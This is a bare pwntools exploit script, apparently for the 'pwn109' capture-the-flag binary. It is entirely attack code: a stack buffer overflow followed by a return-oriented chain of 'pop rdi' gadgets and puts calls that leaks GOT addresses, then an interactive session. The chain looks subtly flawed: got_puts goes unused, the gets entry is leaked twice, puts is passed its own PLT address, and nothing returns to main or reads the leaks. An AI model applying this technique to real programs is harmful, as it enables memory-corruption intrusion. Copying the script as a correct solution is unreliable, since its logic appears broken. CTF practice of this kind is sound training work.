from pwn import *

context.binary = binary = ELF('./pwn109.pwn109', checksec=False)

pop_rdi_ret = p64(0x00000000004012a3)


plt_puts = p64(binary.plt.puts)
got_puts = p64(binary.got.puts)
got_gets = p64(binary.got.gets)

p = process()

payload = b"A" * 0x20
payload += b'B' * 0x8
payload += pop_rdi_ret + got_gets + plt_puts
payload += pop_rdi_ret + got_gets + plt_puts
payload += pop_rdi_ret + plt_puts + plt_puts

p.send(payload)
p.interactive()